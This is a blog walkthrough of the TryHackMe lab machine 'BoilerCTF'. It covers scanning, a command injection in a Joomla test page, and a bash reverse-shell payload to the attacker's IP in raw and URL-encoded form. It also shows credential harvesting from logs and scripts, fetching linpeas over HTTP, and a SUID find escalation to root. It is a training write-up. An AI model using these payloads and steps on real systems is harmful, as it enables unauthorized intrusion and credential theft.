---
layout: post
title: "THM-BoilerCTF"
description: Walkthrough writeup of THM-BoilerCTF
---


<p>In THM-BoilerCTF, we exploited a Joomla command injection for a reverse shell, found SSH creds in logs, pivoted from one user to another, abused SUID, and gained root access.</p>

<h2>Introduction</h2>

<p>In this post, I will demonstrate the exploitation of a medium difficulty machine called "BoilerCTF" on Tryhackme. Overall, it was quite an easy box but there were an awful lot of annoying rabbit holes.</p>

<h2> Step 1: running an Nmap scan on the target</h2>
<pre>
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -sC 10.10.182.94
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 10:38 EDT
Nmap scan report for 10.10.182.94
Host is up (0.076s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.235.177
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).                                                                                             
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                 
| ssh-hostkey:                                                                                                                                                       
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)                                                                                                       
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)                                                                                                      
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)                                                                                                    
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                       
                                                                                                                                                          
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.43 seconds
</pre>
<p>This scan revealed that we have a FTP server which allows anonymous login as well as 2 webservers and ssh</p>

<h2>Step 2: Anonymous FTP login</h2>
<p>First thing I did was logon to the FTP server. However, this was a rabbit hole as there was nothing interesting present here:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.182.94
Connected to 10.10.182.94.
220 (vsFTPd 3.0.3)
Name (10.10.182.94:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43357|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
229 Entering Extended Passive Mode (|||48827|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||46955|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |*************************************************************************************************************************|    74      115.43 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (1.32 KiB/s)

┌──(kali㉿kali)-[~]
└─$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! --> decoded: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
</pre>
<p>Note: the robots.txt file found by Nmap was a rabbit hole and is therefore not discussed.</p>

<h2>Step 3: Enumerating both websites</h2>
<p>I started with some directory bruteforcing using ffuf:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.182.94/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.182.94/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

joomla                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 27ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 39ms]
#www                    [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 75ms]
#mail                   [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 81ms]
#smtp                   [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 72ms]
#pop3                   [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 80ms]
:: Progress: [114442/114442] :: Job [1/1] :: 680 req/sec :: Duration: [0:03:33] :: Errors: 0 ::
</pre>
<p>Doing this, I found out that a joomla CMS is being used. Therefore, I enumerated its version by surfing to: http://10.10.182.94/joomla/administrator/manifests/files/joomla.xml. The version used in this box was version 3.6. After a quick vulnerability search on Google, I could not find any useful vulnerabilities. This was a dead end. Surfing /joomla/adminitrator presented us with a login portal.</p>
<img src="/images/boiler/boiler_joomla_login_portal.webp" alt="Joomla login portal" class="postImage">
<p>Thereafter, I decided to surf to the other webserver located on port 10000. Again, we were greeted by yet another login portal:</p>
<img src="/images/boiler/boiler_webservice_port_10000.webp" alt="webadmin web portal" class="postImage">

<p>Okay, so we have 2 login portals but no credentials. Also some basic sql injection payloads did not work. As a result, I ran a few more ffuf scans to see if there were any other accessible interesting directories:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.56.122/joomla/FUZZ -w /usr/share/wordlists/dirb/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.56.122/joomla/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 5911ms]
_archive                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 80ms]
_database               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 78ms]
_files                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 82ms]
.htpasswd               [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 8075ms]
_test                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 79ms]
administrator           [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 80ms]
bin                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 82ms]
build                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 78ms]
cache                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 323ms]
cli                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 167ms]
components              [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 164ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 80ms]
includes                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 80ms]
installation            [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 79ms]
language                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 76ms]
layouts                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 80ms]
libraries               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 80ms]
media                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 74ms]
modules                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 80ms]
plugins                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 82ms]
templates               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 77ms]
tests                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 79ms]
tmp                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 79ms]
~www                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 79ms]
:: Progress: [20469/20469] :: Job [1/1] :: 507 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
</pre>
<p>Exploring these directories, I came across a few different things. First, there was a docker-compose.yml file containing mysql database credentials at http://IP/joomla/build/jenkins/docker-compose.yml:</p>
<pre>
version: '2'

services:
  test:
    image: joomlaprojects/docker-${PHPVERSION}
    volumes:
     - ../..:/opt/src
    working_dir: /opt/src
    depends_on:
     - mysql
     - memcached
     - redis
     - postgres

  mysql:
   image: mysql:5.7
   restart: always
   environment:
     MYSQL_DATABASE: joomla_ut
     MYSQL_USER: joomla_ut
     MYSQL_PASSWORD: joomla_ut
     MYSQL_ROOT_PASSWORD: joomla_ut

  memcached:
    image: memcached

  redis:
    image: redis

  postgres:
    image: postgres
</pre>
<p>These seem like default credentials. But it could be possible that they are being reused for 1 of the login panels. However, this was not the case. After exploring a few other directories, I finally stumbled upon something we can use to gain initial access to the box.</p>

<h2>Step 4: Gaining access</h2>
<p>Navigating to http://IP/joomla/_test/ presented us with the following page:</p>
<img src="/images/boiler/boiler_vulnerable_page.webp" alt="vulnerable page home" class="postImage">
<p>When we click on "OS" and then chose for example "Linux" the following url is used:</p>
<pre>
http://10.10.56.122/joomla/_test/index.php?plot=LINUX
</pre>
<p>Could we inject a command a plot parameter? Let's test it. Therefore, I opened burpsuite and tried to ping myself as follows:</p>
<img src="/images/boiler/boiler_burpsuite_command_execution_ping.webp" alt="burpsuite achieving command execution" class="postImage">
<p>payload:</p>
<pre>
GET /joomla/_test/index.php?plot=;ping 10.9.235.177;
</pre>
<p>payload url encoded:</p>
<pre>
GET /joomla/_test/index.php?plot=%3b%70%69%6e%67%20%31%30%2e%39%2e%32%33%35%2e%31%37%37%3b
</pre>

<p>The output on our attacking machine:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                                                                                                                                         
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:56:44.591976 IP 10.10.56.122 > 10.9.235.177: ICMP echo request, id 1554, seq 1, length 64
12:56:44.591989 IP 10.9.235.177 > 10.10.56.122: ICMP echo reply, id 1554, seq 1, length 64
12:56:45.598534 IP 10.10.56.122 > 10.9.235.177: ICMP echo request, id 1554, seq 2, length 64
</pre>

<p>Indeed, we have successful code execution!Next, I created a payload for a reverse shell. After some try and error, I got it to work:</p>
<img src="/images/boiler/boiler_burpsuite_reverseshell_request.webp" alt="burpsuite payload reverse shell" class="postImage">
<p>payload:</p>
<pre>
GET /joomla/_test/index.php?plot=;bash -c 'bash -i >& /dev/tcp/10.9.235.177/9000 0>&1';
</pre>
<p>payload url encoded:</p>
<pre>
GET /joomla/_test/index.php?plot=%3bbash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.9.235.177%2f9000%200%3e%261'%3b
</pre>

<h2>Step 5: Lateral privilege escalation to basterd</h2>
<p>In the newly acquired reverse shell, I found an interesting log file containing ssh credentials:</p>
<pre>
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
</pre>
<p>Next, I used these credentials to login as basterd using ssh. In the home directory, I found the following script containing credentials for another user called "stoner":</p>
<pre>
basterd@Vulnerable:~$ cat backup.sh 
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE

                                                                                                                                                                      
if [ -d "$SOURCE" ]; then                                                                                                                                             
    for i in `ls $SOURCE | grep 'data'`;do                                                                                                                            
             echo "Begining copy of" $i  >> $LOG                                                                                                                      
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE                                                                                                              
             echo $i "completed" >> $LOG                                                                                                                              

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
</pre>

<h2>Step 6: Lateral privilege escalation to stoner</h2>
<p>Naturally, I followed the trail and logged on as stoner. In the home directory of stoner, there is .secret file which is the user.txt for this box:</p>
<pre>
stoner@Vulnerable:~$ ls -al
total 20
drwxr-x--- 4 stoner stoner 4096 Aug 18 18:57 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwx------ 2 stoner stoner 4096 Aug 18 18:57 .cache
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
</pre>

<h2>Step 7: Privilege escalation to root</h2>
<p>Next, I uploaded linpeas to the victim machine by hosting a python web server on the attacking machine:</p>
<pre>
python3 -m http.server 7000
</pre>
<p>On the targeted system, I downloaded the script using curl:</p>
<pre>
stoner@Vulnerable:/tmp$ curl -o linpeas.sh http://10.9.235.177:7000/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  932k  100  932k    0     0  4107k      0 --:--:-- --:--:-- --:--:-- 4106k
</pre>
<p>Execution of linpeas revealed that the find binary had the suid permission set. Therefore, this could be easily exploited by spawning a shell gaining root:</p>
<pre>
stoner@Vulnerable:/tmp$ find . -exec /bin/bash -p \; -quit
bash-4.3# whoami
root
bash-4.3# ls /root
root.txt
</pre>
<p>Congratulations, you have successfully rooted this box!</p>
<h2>Final thoughts</h2>
<p>In general, this was an easy box. I'm not quite sure why it is ranked as easy on Tryhackme. It is worth noting that there were quite a few rabbit holes which after some got old real fast. Therefore, it was not the most fun box I have ever rooted.In summary, It was not hard but it was a bit annoying.</p>
<a href="/">Go to the Home Page</a>